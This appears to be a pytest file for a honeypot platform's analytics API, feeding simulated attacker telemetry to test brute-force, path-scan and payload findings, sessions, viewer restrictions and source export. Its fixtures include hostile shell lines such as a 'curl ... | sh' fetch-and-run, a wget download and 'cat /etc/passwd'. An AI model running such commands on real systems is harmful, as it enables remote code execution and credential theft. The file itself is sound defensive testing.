"""Summaries, findings, sessions and source profiles are derived only from stored events."""
from datetime import datetime, timedelta, timezone
from uuid import uuid4
import httpx
from backend.app.main import app
from conftest import running_pot
from test_backend import event

SUMMARY = "/api/v1/analytics/summary"


def at(**ago):
    return (datetime.now(timezone.utc) - timedelta(**ago)).isoformat()


async def send(client, agent, events):
    response = await client.post(f'/api/v1/agents/{agent["X-Agent-ID"]}/telemetry', headers=agent, json={"events": events})
    assert response.status_code == 200, response.text


def login(pot, source, user, result="rejected", session=None, **when):
    return event(honeypot_id=pot["id"], source_ip=source, session_id=session or str(uuid4()), event_type="authentication_attempt",
                 severity="medium", timestamp=at(**when), payload={"username": user, "result": result, "summary": "Telnet login attempt"})


def shell(pot, source, line, severity="medium", session=None, **when):
    return event(honeypot_id=pot["id"], source_ip=source, session_id=session or str(uuid4()), event_type="data_received",
                 severity=severity, timestamp=at(**when), payload={"summary": "Shell command", "input_preview": line, "bytes_received": len(line)})


def request(pot, source, path, **when):
    return event(honeypot_id=pot["id"], source_ip=source, event_type="http_request", protocol="HTTP", timestamp=at(**when),
                 payload={"method": "GET", "path": path, "status": 404, "summary": "GET " + path})


async def viewer_client(client):
    created = await client.post("/api/v1/users", json={"username": "observer", "password": "Observer-pass-12345", "role": "viewer"})
    assert created.status_code == 201, created.text
    other = httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test",
                              headers={"X-HoneyForge": "1", "Origin": "http://test"})
    assert (await other.post("/api/v1/auth/login", json={"username": "observer", "password": "Observer-pass-12345"})).status_code == 200
    return other


async def test_summary_compares_periods_and_names_what_happened(client, controller_headers):
    shell_pot, _, shell_agent = await running_pot(client, controller_headers, "telnet-shell", "shell")
    web, _, web_agent = await running_pot(client, controller_headers, "http-site", "site")
    empty = (await client.get(SUMMARY)).json()
    assert empty["current"]["events"] == 0 and empty["findings"] == [] and empty["comparable"] is False
    assert empty["honeypots"] == {"total": 2, "running": 2, "down": []}

    visit = str(uuid4())
    await send(client, shell_agent, [
        *[login(shell_pot, "8.8.8.8", f"user{n}", minutes=30, seconds=-n * 15) for n in range(7)],
        login(shell_pot, "8.8.8.8", "root", "accepted", session=visit, minutes=28),
        shell(shell_pot, "8.8.8.8", "uname -a", session=visit, minutes=27, seconds=50),
        shell(shell_pot, "8.8.8.8", "wget http://203.0.113.9/x", "high", session=visit, minutes=27, seconds=40),
        login(shell_pot, "1.1.1.1", "admin", "accepted", hours=2),
        login(shell_pot, "9.9.9.9", "guest", hours=30), event(honeypot_id=shell_pot["id"], source_ip="9.9.9.9", timestamp=at(days=3))])
    await send(client, web_agent, [request(web, "8.8.8.8", f"/admin{n}.php", minutes=10) for n in range(9)])

    data = (await client.get(SUMMARY)).json()
    assert data["current"] == {"events": 20, "connections": 0, "authentication_attempts": 9, "http_requests": 9,
                               "commands": 2, "unique_sources": 2, "sessions": 20 - 2}
    assert data["previous"]["authentication_attempts"] == 1 and data["previous"]["events"] == 1
    assert data["comparable"] is True
    found = {(item["kind"], item["source_ip"]): item for item in data["findings"]}
    brute = found[("brute_force", "8.8.8.8")]
    assert brute["severity"] == "high" and brute["honeypot_name"] == "shell" and brute["service_key"] == "telnet-shell"
    assert brute["details"]["attempts"] == 8 and brute["details"]["usernames"] == 8 and brute["details"]["accepted"] == 1
    assert 100 <= brute["details"]["duration_seconds"] <= 130 and brute["scope"] == "public"
    assert found[("login_success", "1.1.1.1")]["details"]["username"] == "admin"
    assert found[("payload_attempt", "8.8.8.8")]["details"]["commands"] == 1
    scan = found[("path_scan", "8.8.8.8")]
    assert scan["details"] == {"requests": 9, "paths": 9, "duration_seconds": 0} and scan["honeypot_name"] == "site"
    assert found[("multi_target", "8.8.8.8")]["details"]["honeypots"] == 2
    assert [item["severity"] for item in data["findings"]] == sorted((item["severity"] for item in data["findings"]),
                                                                    key=["critical", "high", "medium", "low", "info"].index)
    assert ("brute_force", "9.9.9.9") not in found

    only_site = (await client.get(SUMMARY, params={"honeypot_id": web["id"]})).json()
    assert only_site["current"]["events"] == 9 and [item["kind"] for item in only_site["findings"]] == ["path_scan"]
    week = (await client.get(SUMMARY, params={"range": "7d"})).json()
    assert week["current"]["events"] == 22 and week["comparable"] is False
    assert (await client.get(SUMMARY, params={"range": "1y"})).status_code == 422


async def test_a_honeypot_that_stopped_answering_is_reported_as_down(client, controller_headers, factory):
    from sqlalchemy import update
    from backend.app.models import Honeypot
    from backend.app.services import maintenance_once
    pot, _, _ = await running_pot(client, controller_headers, "tcp-banner", "silent")
    stopped, _, _ = await running_pot(client, controller_headers, "tcp-banner", "stopped-on-purpose")
    assert (await client.post(f'/api/v1/honeypots/{stopped["id"]}/stop')).status_code == 200
    async with factory() as db:
        await db.execute(update(Honeypot).where(Honeypot.id == pot["id"]).values(last_seen=datetime.now(timezone.utc) - timedelta(hours=1)))
        await db.commit()
        await maintenance_once(db)
    state = (await client.get(SUMMARY)).json()["honeypots"]
    assert state["total"] == 2 and [(item["name"], item["status"]) for item in state["down"]] == [("silent", "offline")]


async def test_top_values_sessions_and_source_profile(client, controller_headers):
    pot, _, agent = await running_pot(client, controller_headers, "telnet-shell", "shell")
    visit = str(uuid4())
    await send(client, agent, [
        event(honeypot_id=pot["id"], source_ip="8.8.4.4", session_id=visit, timestamp=at(minutes=5)),
        login(pot, "8.8.4.4", "root", session=visit, minutes=4, seconds=50),
        login(pot, "8.8.4.4", "root", "accepted", session=visit, minutes=4, seconds=40),
        shell(pot, "8.8.4.4", "id", session=visit, minutes=4, seconds=30),
        shell(pot, "8.8.4.4", "id", session=visit, minutes=4, seconds=20),
        shell(pot, "8.8.4.4", "curl http://198.51.100.7/a | sh", "high", session=visit, minutes=4, seconds=10),
        login(pot, "8.8.8.8", "admin", minutes=3),
        event(honeypot_id=pot["id"], source_ip="8.8.8.8", event_type="data_received", severity="low",
              payload={"summary": "Laboratory client sent data", "input_preview": "GET / HTTP/1.1", "bytes_received": 14})])

    top = (await client.get("/api/v1/analytics/top")).json()
    assert top["restricted"] is False and top["paths"] == []
    assert top["usernames"] == [{"label": "root", "count": 2}, {"label": "admin", "count": 1}]
    assert top["commands"] == [{"label": "id", "count": 2}, {"label": "curl http://198.51.100.7/a | sh", "count": 1}]

    listed = (await client.get("/api/v1/sessions", params={"source_ip": "8.8.4.4"})).json()
    assert len(listed) == 1 and listed[0]["session_uid"] == visit and listed[0]["event_count"] == 6
    detail = (await client.get(f'/api/v1/sessions/{pot["id"]}/{visit}')).json()
    assert [item["event_type"] for item in detail["events"]] == ["connection"] + ["authentication_attempt"] * 2 + ["data_received"] * 3
    assert detail["outcome"] == {"login_attempts": 2, "logged_in": True, "commands": 3, "requests": 0, "risky": 1}
    assert detail["source_ip"] == "8.8.4.4" and detail["honeypot_name"] == "shell" and 45 <= detail["duration_seconds"] <= 55
    assert detail["events"][-1]["payload"]["input_preview"].startswith("curl ")
    assert (await client.get(f'/api/v1/sessions/{pot["id"]}/{uuid4()}')).status_code == 404

    card = (await client.get("/api/v1/sources/8.8.4.4")).json()
    assert card["scope"] == "public" and card["events"] == 6 and card["sessions"] == 1 and card["country"] is None
    assert card["honeypots"][0]["name"] == "shell" and card["honeypots"][0]["events"] == 6
    assert {item["label"]: item["count"] for item in card["event_types"]} == {"data_received": 3, "authentication_attempt": 2, "connection": 1}
    assert card["usernames"] == [{"label": "root", "count": 2}] and len(card["commands"]) == 2
    assert {item["kind"] for item in card["findings"]} == {"login_success", "payload_attempt"}
    assert card["recent_sessions"][0]["session_uid"] == visit
    assert (await client.get("/api/v1/sources/203.0.113.200")).status_code == 404
    assert (await client.get("/api/v1/sources/not-an-address")).status_code == 422


async def test_observers_get_numbers_but_not_usernames_or_commands(client, controller_headers):
    pot, _, agent = await running_pot(client, controller_headers, "telnet-shell", "shell")
    visit = str(uuid4())
    await send(client, agent, [login(pot, "8.8.4.4", "secret-name", "accepted", session=visit),
                               shell(pot, "8.8.4.4", "cat /etc/passwd", session=visit)])
    observer = await viewer_client(client)
    try:
        top = (await observer.get("/api/v1/analytics/top")).json()
        assert top == {"range": "24h", "from": top["from"], "restricted": True, "usernames": [], "commands": [], "paths": []}
        data = (await observer.get(SUMMARY)).json()
        assert data["current"]["authentication_attempts"] == 1 and data["findings"][0]["details"]["username"] is None
        card = (await observer.get("/api/v1/sources/8.8.4.4")).json()
        assert card["restricted"] is True and card["usernames"] == [] and card["events"] == 2
        detail = (await observer.get(f'/api/v1/sessions/{pot["id"]}/{visit}')).json()
        assert "secret-name" not in str(detail) and "passwd" not in str(detail) and detail["outcome"]["commands"] == 1
        assert (await observer.get("/api/v1/export/sources")).status_code == 403
    finally:
        await observer.aclose()


async def test_source_export_lists_only_public_addresses(client, controller_headers):
    pot, _, agent = await running_pot(client, controller_headers)
    await send(client, agent, [event(honeypot_id=pot["id"], source_ip=address) for address in
                               ("8.8.8.8", "8.8.8.8", "1.1.1.1", "172.18.0.5", "127.0.0.1", "192.0.2.10", "10.0.0.7")] +
               [event(honeypot_id=pot["id"], source_ip="9.9.9.9", timestamp=at(days=20))])
    text = await client.get("/api/v1/export/sources")
    assert text.status_code == 200 and text.headers["content-type"].startswith("text/plain")
    assert "honeyforge-sources-7d.txt" in text.headers["content-disposition"]
    lines = text.text.splitlines()
    assert [line for line in lines if not line.startswith("#")] == ["8.8.8.8", "1.1.1.1"]
    assert any("не подтверждена" in line for line in lines if line.startswith("#"))
    table = (await client.get("/api/v1/export/sources", params={"format": "csv", "range": "30d"})).text.splitlines()
    assert table[0] == "source_ip,events,first_seen,last_seen,honeypots,country_code"
    assert [row.split(",")[0] for row in table[1:]] == ["8.8.8.8", "1.1.1.1", "9.9.9.9"] and table[1].split(",")[1] == "2"
    actions = [row["action"] for row in (await client.get("/api/v1/audit")).json()["items"]]
    assert actions.count("sources.export") == 2
